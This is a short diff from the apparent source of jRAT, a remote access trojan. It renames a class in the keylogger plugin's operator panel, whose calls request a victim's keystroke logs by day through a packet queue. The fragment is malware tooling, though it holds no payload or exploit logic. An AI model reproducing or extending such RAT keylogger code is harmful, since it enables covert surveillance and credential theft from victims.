@@ -32,7 +32,7 @@ import javax.swing.text.StyleConstants;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
-import se.jrat.plugin.keylogger.client.ClientPlugin;
+import se.jrat.plugin.keylogger.client.KeyloggerPlugin;
 import se.jrat.plugin.keylogger.client.HeartbeatThread;
 import jrat.api.BaseControlPanel;
 import jrat.api.PacketBuilder;
@@ -149,7 +149,7 @@ public class PanelKeylogger extends BaseControlPanel {
 					final DayTreeNode day = (DayTreeNode)event.getPath().getPath()[3];
 					
 					try {
-						getServer().addToSendQueue(new PacketBuilder(ClientPlugin.LOG_HEADER, getServer()) {
+						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
 							@Override
 							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 								dos.writeUTF(year.toString());
@@ -180,7 +180,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			
 			((DefaultMutableTreeNode)tree.getModel().getRoot()).removeAllChildren();
 			
-			getServer().addToSendQueue(new PacketBuilder(ClientPlugin.LOGS_HEADER, getServer()) {
+			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
 				@Override
 				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 
